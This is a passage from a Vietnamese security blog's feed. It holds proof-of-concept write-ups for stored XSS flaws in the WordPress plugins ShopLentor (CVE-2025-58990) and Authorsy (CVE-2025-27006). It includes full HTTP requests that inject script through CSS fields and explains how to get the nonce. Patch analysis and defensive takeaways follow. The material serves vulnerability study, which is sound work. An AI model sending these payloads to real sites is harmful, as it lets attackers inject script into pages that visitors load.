&lt;strong&gt;POST&lt;/strong&gt; request ƒë·∫øn endpoint &lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt; v·ªõi XSS payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/woolentor/v1/save_css HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;post_id&amp;#34;:1416,&#xA;&amp;#34;has_block&amp;#34;:true,&#xA;&amp;#34;block_css&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;    &amp;#34;code&amp;#34;:&amp;#34;rest_forbidden&amp;#34;,&#xA;    &amp;#34;message&amp;#34;:&amp;#34;Sorry, you are not allowed to do that.&amp;#34;,&#xA;    &amp;#34;data&amp;#34;:{&#xA;        &amp;#34;status&amp;#34;:401&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ Thi·∫øu header &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; ƒë·ªÉ ph√¢n quy·ªÅn ng∆∞·ªùi d√πng. Ta m·ªü source HTML (&lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;U&lt;/kbd&gt;) trang ch·ªânh s·ª≠a b√†i vi·∫øt:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;view-source:http://localhost/wp-admin/post.php?post=&amp;lt;post_id&amp;gt;&amp;amp;action=edit&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T√¨m &lt;code&gt;wpApiSettings&lt;/code&gt; trong source v√† l·∫•y gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/api_search.png&#34;&#xA;    alt=&#34;wpApiSettings&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;wpApiSettings&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;G·ª≠i request v·ªõi &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; c√≥ gi√° tr·ªã v·ª´a l·∫•y ƒë∆∞·ª£c&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/woolentor/v1/save_css HTTP/1.1&#xA;Host: localhost&#xA;X-WP-Nonce: f79ec79e4b&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;post_id&amp;#34;:1416,&#xA;&amp;#34;has_block&amp;#34;:true,&#xA;&amp;#34;block_css&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Preview post&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/preview.png&#34;&#xA;    alt=&#34;Preview&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Preview&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ XSS th√†nh c√¥ng, &lt;strong&gt;inspect&lt;/strong&gt; ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;View source code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/code.png&#34;&#xA;    alt=&#34;Code&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Code&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-58990&lt;/strong&gt; trong plugin &lt;strong&gt;ShopLentor &amp;lt;= 3.2.0&lt;/strong&gt; cho ph√©p &lt;strong&gt;contributor&lt;/strong&gt; ch√®n CSS ƒë·ªôc h·∫°i d·∫´n ƒë·∫øn Stored XSS khi admin/author preview ho·∫∑c xem post. B·∫£n v√° &lt;strong&gt;3.2.1&lt;/strong&gt; b·ªï sung ki·ªÉm tra quy·ªÅn v√† sanitize CSS, ngƒÉn ch·∫∑n khai th√°c.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n k·∫øt h·ª£p &lt;strong&gt;ki·ªÉm tra quy·ªÅn&lt;/strong&gt; v√† &lt;strong&gt;sanitize&lt;/strong&gt; d·ªØ li·ªáu khi x·ª≠ l√Ω input t·ª´ ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;C√°c role th·∫•p (nh∆∞ &lt;strong&gt;contributor&lt;/strong&gt;) v·∫´n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm t·∫•n c√¥ng n·∫øu API kh√¥ng b·∫£o v·ªá ƒë√∫ng c√°ch.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; trong WordPress th∆∞·ªùng xu·∫•t hi·ªán khi d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u DB/file =&amp;gt; render inline m√† kh√¥ng l·ªçc.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác c·∫≠p nh·∫≠t plugin k·ªãp th·ªùi l√† bi·ªán ph√°p ph√≤ng th·ªß ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ nh·∫•t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress ShopLentor Plugin &amp;lt;= 3.2.0 is vulnerable to Cross Site Scripting (XSS) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-27006 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-04-cve-2025-27006/</link>
      <pubDate>Sat, 04 Oct 2025 19:37:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-04-cve-2025-27006/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Authorsy&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;1.0.6&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-27006&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-27006&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/authorsy/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Authorsy Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.0.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;OWASP Top 10&lt;/strong&gt;: A1: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn &lt;strong&gt;Subscriber&lt;/strong&gt; nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c &lt;strong&gt;Unauthenticated&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Authorsy&lt;/strong&gt;: v1.0.5(vul) v√† v1.0.6(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong &lt;code&gt;wp_options&lt;/code&gt; v√† ch√®n tr·ª±c ti·∫øp v√†o &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† &lt;strong&gt;kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn&lt;/strong&gt;, d·∫´n ƒë·∫øn nguy c∆° &lt;strong&gt;Broken Access Control&lt;/strong&gt; v√† c√≥ th·ªÉ &lt;strong&gt;XSS&lt;/strong&gt; n·∫øu ch√®n payload ƒë·ªôc h·∫°i.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file &lt;strong&gt;core/settings/api-settings.php&lt;/strong&gt; v√† &lt;strong&gt;core/enqueue-inline/enqueue-inline.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff1.png&#34;&#xA;    alt=&#34;Diff showing changes in enqueue-inline.php to sanitize custom CSS&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff showing changes in enqueue-inline.php to sanitize custom CSS&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff2.png&#34;&#xA;    alt=&#34;Diff showing REST API permission callback changes in api-settings.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff showing REST API permission callback changes in api-settings.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i &lt;strong&gt;POST&lt;/strong&gt; request ƒë·∫øn &lt;code&gt;/wp-json/authorsy/v1/settings&lt;/code&gt; v·ªõi XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/authorsy/v1/settings HTTP/1.1&#xA;Host: localhost&#xA;&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;primary_color&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta ƒë√≥ng th·∫ª &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; (CSS trong head) v√† inject th√™m th·∫ª &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; ch·ª©a XSS payload.&lt;/p&gt;&#xA;&lt;p&gt;Truy c·∫≠p m·ªôt trang b·∫•t k·ª≥.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/xss.png&#34;&#xA;    alt=&#34;XSS payload injected via custom CSS&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;XSS payload injected via custom CSS&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ XSS th√†nh c√¥ng, &lt;strong&gt;inspect&lt;/strong&gt; ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;&#xA;    :root { &#xA;        --ea-color-main: &amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;;  &#xA;    } &#xA;&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;code&gt;CVE-2025-27006&lt;/code&gt; trong plugin &lt;strong&gt;Authorsy &amp;lt;= 1.0.5&lt;/strong&gt; l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ &lt;strong&gt;Broken Access Control&lt;/strong&gt; k·∫øt h·ª£p v·ªõi &lt;strong&gt;XSS&lt;/strong&gt;. Nguy√™n nh√¢n ch√≠nh l√†:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API&lt;/strong&gt; kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi &lt;code&gt;/wp-json/authorsy/v1/settings&lt;/code&gt; ƒë·ªÉ thay ƒë·ªïi c√°c option.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CSS&lt;/strong&gt; t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c &lt;strong&gt;sanitize&lt;/strong&gt;: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; trong &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; th√¥ng qua CSS.&#xA;Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: &lt;strong&gt;verify_nonce&lt;/strong&gt; ch·ªâ tr·∫£ v·ªÅ &lt;strong&gt;WP_Error&lt;/strong&gt; m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API&lt;/strong&gt; c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng &lt;code&gt;permission_callback&lt;/code&gt; h·ª£p l√Ω ƒë·ªÉ ngƒÉn &lt;strong&gt;Broken Access Control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng &lt;strong&gt;XSS&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 